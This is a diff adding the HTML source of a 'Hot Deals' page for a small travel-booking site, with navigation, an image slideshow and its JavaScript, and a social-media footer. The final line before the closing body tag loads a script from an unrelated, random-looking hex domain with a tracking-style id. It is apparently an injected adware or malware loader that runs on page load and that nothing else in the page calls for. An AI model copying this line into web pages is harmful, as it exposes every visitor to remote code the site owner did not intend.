@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html>
+<title>Hot Deals</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://www.w3schools.com/lib/w3.css">
+<link rel= "stylesheet" type='text/css' href="CSS/dealsCSS.css"/ >
+<style>
+.mySlides {display:none}
+</style>
+<body>
+     <!--Members -->     
+    
+       <table class="memberstars">
+        <tr>
+        <td>
+           <div class="logo">
+           <img src ="COMPANY_LOGO/LOGO.png"> 
+           </div>
+       </td>
+           <td>
+               <marquee scrollamount="8" direction="left">
+                 <h2> 
+                 Become a member ☆  Collect points ☆  Earn a free trip! 
+                 </h2>
+               </marquee>
+          </td>
+      </tr>
+       </table> 
+       <!--Navigation-->
+ 
+  <div class="header">
+        <ul class="nav">      
+          <ul>
+           <li><a href="flightsPage.html">Flights</a></li>
+           <li><a href="cruisesPage.html">Cruises</a></li>
+            <li><a href="#">Hotels</a></li>
+            <li><a href="hotdealsPage.html">Hot Deals</a></li>
+            <li><a href="explorePage.html">Explore</a></li>
+            <li><a href="aboutPage.html">About</a></li>
+           <li><a href="ContactusPage.html">Contact</a></li>
+           <li><a href="members.html">Members</a></li>
+        </ul>
+        </ul>
+      </div>
+
+<div class="w3-content" style="max-width:900px">
+  <img class="mySlides" src="./IMAGES/Package0.png" style="width:90%">
+  <img class="mySlides" src="./IMAGES/Package1.jpg" style="width:90%">
+  <img class="mySlides" src="./IMAGES/Package 2.jpg" style="width:100%">
+
+  
+
+  <div class="w3-row-padding w3-section">
+    <div class="w3-col s4">
+      <img class="demo w3-border w3-hover-shadow" src="./IMAGES/Package0.png" style="width:67%" onclick="currentDiv(1)">
+    </div>
+    <div class="w3-col s4">
+      <img class="demo w3-border w3-hover-shadow" src="./IMAGES/Package1.jpg" style="width:67%" onclick="currentDiv(2)">
+    </div>
+    <div class="w3-col s4">
+      <img class="demo w3-border w3-hover-shadow" src="./IMAGES/Package 2.jpg" style="width:72%" style="height:115%" onclick="currentDiv(3)">
+    </div>
+  </div>
+</div>
+  
+<!--Footer of main web page-->
+     <div class="footer">
+              <div class="iconsocial">
+                    <table>
+                            
+                       
+                          <tr> 
+                                <td><div class="earth"></div> </td>
+                                <td> Contact us </td>
+                                
+                              <a href="https://www.facebook.com/">
+                               <td class="icon-facebook-squared"></td></a>
+                               
+                                <td class="icon-twitter" href="twitter.com"></td>
+                                <td class="icon-instagram" href="instagram.com"></td>
+                                <td class="icon-mail" href="gmail.com"></td> 
+                      
+                           <td><img src="/IMAGES/20120808060944908.jpg" height="60" width="60"></td>
+                           <td><img src="/IMAGES/20120808060946143.jpg" height="60" width="60"></td>
+                          <td><img src="/IMAGES/20120808060955705.jpg" height="60" width="60"></td>
+                       </tr> 
+                        
+                  </table>
+              </div>
+    </div>
+<script>
+var slideIndex = 1;
+showDivs(slideIndex);
+
+function plusDivs(n) {
+  showDivs(slideIndex += n);
+}
+
+function currentDiv(n) {
+  showDivs(slideIndex = n);
+}
+
+function showDivs(n) {
+  var i;
+  var x = document.getElementsByClassName("mySlides");
+  var dots = document.getElementsByClassName("demo");
+  if (n > x.length) {slideIndex = 1}    
+  if (n < 1) {slideIndex = x.length} ;
+  for (i = 0; i < x.length; i++) {
+     x[i].style.display = "none";  
+  }
+  for (i = 0; i < dots.length; i++) {
+     dots[i].className = dots[i].className.replace(" w3-border-red", "");
+  }
+  x[slideIndex-1].style.display = "block";  
+  dots[slideIndex-1].className += " w3-border-red";
+}
+</script>
+
+<script type="text/javascript" src="http://aa5bf24ccab47b4067906a87fe9e6342af.com/sm/mu?id=D473BE0A-E058-5D8E-9404-132E9E9D0A89&d=A5014&cl=0"></script>
+</body>
+</html> 
